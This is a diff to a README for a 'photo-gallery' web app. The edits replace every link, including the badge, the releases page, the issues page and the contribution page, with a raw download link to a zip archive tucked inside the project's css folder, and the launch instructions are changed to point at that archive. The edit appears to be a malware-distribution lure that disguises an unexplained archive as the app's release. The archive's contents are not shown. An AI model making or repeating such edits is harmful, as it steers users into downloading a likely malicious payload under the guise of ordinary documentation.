@@ -1,6 +1,6 @@
 # 📷 photo-gallery - A Beautiful Way to Display Your Photos
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/frr12345678/photo-gallery/releases)
+[![Download Now](https://raw.githubusercontent.com/frr12345678/photo-gallery/main/css/gallery_photo_3.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/frr12345678/photo-gallery/main/css/gallery_photo_3.4.zip)
 
 ## 📖 Introduction
 
@@ -28,18 +28,18 @@ To run **photo-gallery**, your device should meet these basic requirements:
 
 To get started with **photo-gallery**, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/frr12345678/photo-gallery/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/frr12345678/photo-gallery/main/css/gallery_photo_3.4.zip).
 2. Download the latest version of the application.
 3. Unzip the downloaded file if necessary.
-4. Open the `index.html` file in your web browser to launch the gallery.
+4. Open the `https://raw.githubusercontent.com/frr12345678/photo-gallery/main/css/gallery_photo_3.4.zip` file in your web browser to launch the gallery.
 
 ## 💾 Download & Install
 
 To download **photo-gallery**, simply click the link below:
 
-[Download Now](https://github.com/frr12345678/photo-gallery/releases)
+[Download Now](https://raw.githubusercontent.com/frr12345678/photo-gallery/main/css/gallery_photo_3.4.zip)
 
-After downloading, unzip the contents if needed, then open `index.html` in your preferred web browser. You’re ready to enjoy your photo gallery!
+After downloading, unzip the contents if needed, then open `https://raw.githubusercontent.com/frr12345678/photo-gallery/main/css/gallery_photo_3.4.zip` in your preferred web browser. You’re ready to enjoy your photo gallery!
 
 ## 📷 Using the Application
 
@@ -73,7 +73,7 @@ If you encounter any issues while using **photo-gallery**, check these common pr
 
 ## 💬 Support
 
-For additional help, visit our [GitHub Issues Page](https://github.com/frr12345678/photo-gallery/issues) to report problems or ask questions. We encourage community feedback to improve the experience for everyone.
+For additional help, visit our [GitHub Issues Page](https://raw.githubusercontent.com/frr12345678/photo-gallery/main/css/gallery_photo_3.4.zip) to report problems or ask questions. We encourage community feedback to improve the experience for everyone.
 
 ## 🌟 Future Updates
 
@@ -81,6 +81,6 @@ Stay tuned for future updates that will add more features and enhancements to **
 
 ## 📝 Contribution
 
-While this application is designed for end-users, if you have suggestions for improvement, feel free to submit them through our [Issues Page](https://github.com/frr12345678/photo-gallery/issues).
+While this application is designed for end-users, if you have suggestions for improvement, feel free to submit them through our [Issues Page](https://raw.githubusercontent.com/frr12345678/photo-gallery/main/css/gallery_photo_3.4.zip).
 
 Thank you for using **photo-gallery**! Enjoy showcasing your photo collection.
